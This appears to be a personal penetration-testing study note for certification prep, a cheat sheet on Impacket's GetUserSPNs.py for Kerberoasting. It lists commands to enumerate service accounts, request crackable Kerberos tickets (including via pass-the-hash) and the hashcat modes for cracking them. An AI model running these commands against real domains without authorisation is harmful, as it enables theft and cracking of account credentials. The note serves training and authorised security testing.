---
tags: [cpts, tool, impacket, kerberoasting]
---

# 🧰 Impacket — GetUserSPNs.py

## 📦 Install
See [[Tool-Install]].

## 🎯 Purpose
Enumerate SPN-bearing accounts and request/extract Kerberos TGS tickets in a Hashcat-crackable format (Kerberoasting).

## 🧱 Core syntax
```bash
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER
```

## 🚩 Useful flags
```text
-request                    # request TGS for all discovered SPN accounts
-request-user $TARGET        # request TGS for one specific account
-outputfile $FILE            # save extracted hash(es)
-dc-ip $DC_IP                 # target DC
-hashes $LM:$NT               # auth via NT hash instead of password
-no-pass                     # skip password prompt
-k                            # use Kerberos auth
-aesKey $KEY                  # auth via AES key
```

## 🔧 Variants
```bash
# Enumerate only
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER

# Request all tickets
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER -request

# One account, saved to file
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER -request-user $TARGET -outputfile $TARGET_tgs

# Pass-the-hash auth
GetUserSPNs.py -dc-ip $DC_IP -hashes $LM:$NT $DOMAIN/$USER -request
```

Output format: `$krb5tgs$23$*user$REALM$SPN*$...` → crack with `hashcat -m 13100` (RC4) or `-m 19700` (AES256).

#impacket #kerberoasting #cpts
